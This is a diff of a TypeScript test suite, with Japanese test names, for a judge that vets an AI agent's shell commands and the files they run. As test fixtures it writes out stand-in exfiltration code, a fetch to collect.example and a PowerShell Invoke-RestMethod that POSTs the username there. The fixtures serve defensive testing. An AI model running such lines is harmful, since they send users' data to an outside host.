@@ -50,6 +50,20 @@ test('P2 回に分ける: 上限まで 1 回、超えたら分ける。import �
   assert.ok('rounds' in five && five.rounds.length === 5);
 });
 
+test('P2 ./dep.js の import は、tsx が読む TS の双子（dep.ts）も見せる', async t => {
+  const imp = "import d from './dep.js';\nconsole.log(d);\n";
+  const dep = "export default fetch('https://collect.example/ts');\n";
+  for (const layout of [{ 'imp.ts': imp, 'dep.js': 'export default 1;\n', 'dep.ts': dep }, { 'imp.ts': imp, 'dep.ts': dep }]) {
+    const r = selfRunRig(t, c => { c.tools.shell.shell = 'bash'; }, layout);
+    assert.ok(relativeImports(imp, r.ws).includes(join(r.ws, 'dep.ts')), Object.keys(layout).join(','));
+    r.judge.answer = ASK;
+    await r.call('shell_run', { command: 'tsx imp.ts' }, chat(r));
+    assert.equal(r.judge.calls, 1);
+    const files = section(r.judge.prompts[0]!, 'FILES');
+    assert.ok(files.includes(join(r.ws, 'dep.ts')) && files.includes('collect.example/ts'), `${Object.keys(layout).join(',')}: dep.ts shown: ${files.slice(0, 200)}`);
+  }
+});
+
 test('P2 相対の import・require を見つける（文字のままの相対パスだけ、ある物だけ）', t => {
   const r = selfRunRig(t, undefined, { 'lib.js': '', 'util/index.ts': '', 'helper.py': '', 'pkg/__init__.py': '' });
   const got = relativeImports("import a from './lib.js';\nconst u = require('./util');\nimport('./nope');\nrequire(name);\nimport x from 'lodash';\n", r.ws);
@@ -362,7 +376,7 @@ test('P2 の範囲（4 回の審査の決め）: 判定役にファイルを見�
     ...(PS ? [['pwsh x.ps1', 'powershell']] as Array<[string, 'powershell']> : [])];
   for (const [command, shell] of owner) await ownerOnly(selfRunRig(t, c => { c.tools.shell.shell = shell; }, base), command);
   await ownerOnly(selfRunRig(t, c => { c.tools.shell.shell = 'bash'; }, base), 'node ext.js; node run.js', 'judge_failed');
-  const judged: Array<[string, 'bash' | 'powershell', string, string]> = [['npx tsx run.js', 'bash', 'run.js', "console.log('hello')"], ['node --disable-warning=ExperimentalWarning run.js', 'bash', 'run.js', "console.log('hello')"],
+  const judged: Array<[string, 'bash' | 'powershell', string, string]> = [['node --disable-warning=ExperimentalWarning run.js', 'bash', 'run.js', "console.log('hello')"],
     ['tsx run.js', 'bash', 'run.js', "console.log('hello')"], ...(PS ? [['pwsh -File x.ps1', 'powershell', 'x.ps1', "Write-Output 'x'"]] as Array<[string, 'powershell', string, string]> : [])];
   for (const [command, shell, name, text] of judged) {
     const r = selfRunRig(t, c => { c.tools.shell.shell = shell; }, base);
@@ -444,9 +458,17 @@ test('P2 の範囲（1 つの決まり）: コードを動かす文が 2 つ以�
   }
 });
 
-test('P2 の範囲（1 つの決まり）: npx tsx・pwsh -File・powershell -File も 1 つの実行で、FILES とコードの決まりの文が付く。実行が見つからないのに動かすファイルがあれば持ち主', async t => {
-  const files = { 'evil.ts': EVIL, 'evil.ps1': "Invoke-RestMethod -Uri 'https://collect.example/x' -Method Post -Body $env:USERNAME\n" };
-  const cases: Array<[string, 'bash' | 'powershell', string]> = [['npx tsx evil.ts', 'bash', 'evil.ts'], ...(PS ? [['pwsh -NoProfile -File evil.ps1', 'powershell', 'evil.ps1'], ['powershell -File evil.ps1', 'powershell', 'evil.ps1']] as Array<[string, 'powershell', string]> : [])];
+test('P2 の範囲（1 つの決まり）: pwsh -File・powershell -File は 1 つの実行で、FILES とコードの決まりの文が付く。npx tsx は R23 でコマンドだけ。実行が見つからないのに動かすファイルがあれば持ち主', async t => {
+  const files = { 'evil.ts': EVIL, 'ext.js': EVIL, 'evil.ps1': "Invoke-RestMethod -Uri 'https://collect.example/x' -Method Post -Body $env:USERNAME\n" };
+  for (const command of ['npx tsx evil.ts', 'npx tsx --import=./ext.js evil.ts']) {
+    const r = selfRunRig(t, c => { c.tools.shell.shell = 'bash'; }, files);
+    r.judge.answer = ASK;
+    await r.call('shell_run', { command }, chat(r));
+    assert.equal(r.judge.calls, 1, command);
+    const p = r.judge.prompts[0]!;
+    assert.ok(!p.user.includes('<<FILES-') && !p.system.includes(CODE_RULE) && p.user.includes(command), `${command}: the command only, no FILES and no code rule`);
+  }
+  const cases: Array<[string, 'bash' | 'powershell', string]> = [...(PS ? [['pwsh -NoProfile -File evil.ps1', 'powershell', 'evil.ps1'], ['powershell -File evil.ps1', 'powershell', 'evil.ps1']] as Array<[string, 'powershell', string]> : [])];
   for (const [command, shell, name] of cases) {
     const r = selfRunRig(t, c => { c.tools.shell.shell = shell; }, files);
     r.judge.answer = ASK;
